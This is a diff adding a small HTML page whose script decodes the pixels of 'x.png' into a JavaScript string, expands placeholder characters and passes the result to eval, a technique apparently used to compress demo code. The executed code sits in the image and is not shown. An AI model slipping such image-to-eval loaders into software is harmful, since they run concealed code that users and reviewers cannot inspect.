@@ -1,0 +1,6 @@
+<!DOCTYPE HTML>
+<html lang="en-US"><head><title></title><meta charset="UTF-8"><script src="/static/jquery-1.4.2.min.js"></script></head><body><script><!--
+map=null;
+(function(g,k){var c=document.createElement("canvas"),e;if(!c.getContext||!(e=c.getContext("2d"))||!e.getImageData)alert("No canvas");else{var d=new Image,i=d.style;i.position="absolute";i.left="-1000px";document.body.appendChild(d);d.onload=function(){var a=this.offsetWidth,b=this.offsetHeight;c.width=a;c.height=b;var f=c.style;f.width=a+"px";f.height=b+"px";e.drawImage(this,0,0);a=e.getImageData(0,0,a,b).data;b="";f=a.length;for(var h=0;h<f;h+=4){var j=a[h];b+=String.fromCharCode(j>0?j+31:10)}k(b);
+document.body.removeChild(d)};d.src=g}})("x.png",function(g){eval(g.replace(/@/g,"function").replace(/\`/g,"this"));S()});
+--></script></body></html>
